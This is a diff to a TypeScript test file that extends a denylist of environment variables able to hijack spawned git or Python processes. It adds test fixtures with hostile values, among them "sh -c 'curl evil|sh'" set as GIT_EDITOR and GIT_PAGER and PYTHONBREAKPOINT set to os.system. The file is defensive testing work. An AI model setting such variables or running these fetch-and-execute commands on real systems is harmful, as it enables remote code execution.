@@ -62,6 +62,14 @@ describe("isBlockedSpawnEnvKey (loader/interpreter hijack keys)", () => {
 		"GIT_CONFIG_COUNT",
 		"GIT_CONFIG_KEY_0",
 		"GIT_CONFIG_VALUE_0",
+		"GIT_CONFIG_GLOBAL",
+		"GIT_CONFIG_SYSTEM",
+		"git_config_global",
+		"GIT_EDITOR",
+		"GIT_SEQUENCE_EDITOR",
+		"GIT_PAGER",
+		"GIT_TEMPLATE_DIR",
+		"PYTHONBREAKPOINT",
 	])("blocks %s", (key) => {
 		expect(isBlockedSpawnEnvKey(key)).toBe(true);
 	});
@@ -86,6 +94,18 @@ describe("isBlockedSpawnEnvKey (loader/interpreter hijack keys)", () => {
 		expect(isBlockedSpawnEnvKey("GIT_AUTHOR_NAME")).toBe(false);
 		expect(isBlockedSpawnEnvKey("GIT_COMMITTER_NAME")).toBe(false);
 		expect(isBlockedSpawnEnvKey("GIT_TERMINAL_PROMPT")).toBe(false);
+		// Shares the first ten characters of the GIT_CONFIG_ prefix; the trailing
+		// underscore is what makes that family a namespace, so this must not match.
+		expect(isBlockedSpawnEnvKey("GIT_CONFIGURATION")).toBe(false);
+		// Bare GIT_CONFIG does not resolve aliases, so it is not an execution
+		// primitive and is deliberately absent from the denylist.
+		expect(isBlockedSpawnEnvKey("GIT_CONFIG")).toBe(false);
+		// git resolves its editor from GIT_EDITOR / core.editor / EDITOR and never
+		// consults VISUAL, so VISUAL is not a git execution primitive.
+		expect(isBlockedSpawnEnvKey("VISUAL")).toBe(false);
+		// EDITOR *is* spawned by git, but it is a universal variable rather than a
+		// git-specific one; see the PR discussion before adding it here.
+		expect(isBlockedSpawnEnvKey("EDITOR")).toBe(false);
 	});
 });
 
@@ -126,5 +146,27 @@ describe("sanitizeSpawnEnv", () => {
 			SAFE_KEY: "ok",
 		});
 		expect(out).toEqual({ SAFE_KEY: "ok" });
+	});
+
+	it("drops git config-file and spawned-helper primitives, keeps benign git keys", () => {
+		const out = sanitizeSpawnEnv({
+			GIT_CONFIG_GLOBAL: "/tmp/evil.gitconfig",
+			GIT_CONFIG_SYSTEM: "/tmp/evil.gitconfig",
+			GIT_EDITOR: "sh -c 'curl evil|sh'",
+			GIT_SEQUENCE_EDITOR: "sh -c 'curl evil|sh'",
+			GIT_PAGER: "sh -c 'curl evil|sh'",
+			GIT_TEMPLATE_DIR: "/tmp/evil-template",
+			PYTHONBREAKPOINT: "os.system",
+			GIT_AUTHOR_NAME: "test",
+			GIT_CONFIGURATION: "not-a-primitive",
+			PYTHON_VERSION: "3.13",
+			SAFE_KEY: "ok",
+		});
+		expect(out).toEqual({
+			GIT_AUTHOR_NAME: "test",
+			GIT_CONFIGURATION: "not-a-primitive",
+			PYTHON_VERSION: "3.13",
+			SAFE_KEY: "ok",
+		});
 	});
 });
